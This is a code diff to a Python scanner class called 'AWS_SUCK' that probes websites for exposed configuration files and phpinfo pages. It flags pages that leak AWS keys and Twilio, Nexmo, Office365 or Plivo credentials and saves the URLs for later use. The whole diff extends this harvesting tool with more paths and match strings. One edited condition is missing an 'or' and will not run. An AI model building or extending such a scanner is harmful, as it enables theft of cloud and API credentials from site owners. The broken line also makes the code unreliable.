@@ -44,7 +44,12 @@ class AWS_SUCK:
 			"/phpinfo.php",
 			"/aws.yml", 
 			"/info.php", 
-			"/config/aws.yml", 
+			"/config/aws.yml",
+                        "/.json", 
+                        "/.config", 
+                        "/config.yaml", 
+                        "/config.json", 
+                       "/index.php", 
 		]
 
 
@@ -75,17 +80,17 @@ class AWS_SUCK:
 			# TAMBAHIN KATA YANG KALIAN CARI
 
 			# TWILLIO
-			if "TWILIO" in isi or "twilio" in isi:
+			if "TWILIO_ACCOUNT_SID" in isi or "TWILLIO_SID" in isi or "TWILLIO_ACCOUNT_SID" in isi or "TWILIO_SID" in isi or '"twilio"' in isi or "ACCOUNT_SID" in isi:
 				print ("{}[!] FOUND TWILIO {}".format(self.green, url))
 				self.save("TWILIO.txt", url)
 	        
 			# AWS
-			if "AKIA" in isi:
+			if "AKIA" in isi '"AKIA"' in isi:
 				print ("{}[!] FOUND AWS {}".format(self.green, url))
 				self.save("AWS.txt", url)
 
 			# NEXMO
-			if "NEXMO" in isi or "nexmo" in isi:
+			if "NEXMO" in isi or '"NEXMO"' in isi or '"nexmo"' in isi:
 				print ("{}[!] FOUND NEXMO {}".format(self.green, url))
 				self.save("NEXMO.txt", url)
 
@@ -115,7 +120,7 @@ class AWS_SUCK:
 				self.save("COINPAYMENTS.txt", url)
 
 			# OFFICE365
-			if "office365" in isi:
+			if '"office365"' in isi or "office365" in isi:
 				print ("{}[!] FOUND OFFICE365 {}".format(self.green, url))
 				self.save("OFFICE365.txt", url)
 
@@ -125,7 +130,7 @@ class AWS_SUCK:
 				self.save("MANDRILL.txt", url)
 
 			# PLIVO
-			if "PLIVO" in isi or "plivo" in isi:
+			if "PLIVO" in isi or "plivo" in isi or '"PLIVO"' in isi or '"plivo"' in isi:
 				print ("{}[!] FOUND PLIVO {}".format(self.green, url))
 				self.save("PLIVO.txt", url)
 
